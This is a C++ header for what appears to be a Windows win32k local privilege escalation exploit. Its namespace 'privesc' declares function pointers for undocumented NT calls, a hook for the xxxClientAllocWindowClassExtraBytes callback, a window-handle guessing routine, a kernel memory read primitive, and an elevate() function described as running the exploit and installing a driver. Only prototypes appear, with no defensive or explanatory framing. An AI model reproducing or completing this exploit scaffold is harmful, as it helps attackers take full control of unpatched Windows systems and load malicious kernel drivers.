#pragma once
#include <windows.h>
#include <stdio.h>
#include <time.h>

namespace privesc {

	typedef void* (NTAPI* lHMValidateHandle)(HANDLE h, int type);
	typedef DWORD64(NTAPI* fnxxxClientAllocWindowClassExtraBytes)(DWORD64* a1);
	typedef DWORD64(NTAPI* fnNtUserConsoleControl)(int nConsoleCommand, HWND* pHwnd, int nConsoleInformationLength);
	typedef DWORD64(NTAPI* fnNtCallbackReturn)(DWORD64* a1, DWORD64 a2, DWORD64 a3);
	typedef DWORD64 QWORD;

	#define _BYTE  uint8
	#define _WORD  uint16
	#define _DWORD uint32
	#define _QWORD uint64
	
	BOOL FindHMValidateHandle();
	HWND GuessHwnd(QWORD* pBaseAddress, DWORD dwRegionSize);
	DWORD64 g_newxxxClientAllocWindowClassExtraBytes(DWORD64* a1);
	LRESULT __fastcall MyWndProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4);
	QWORD MyRead64(QWORD qwDestAddr);

	// Function which performs the win32k LPE and driver::install_driver() function
	int elevate();
}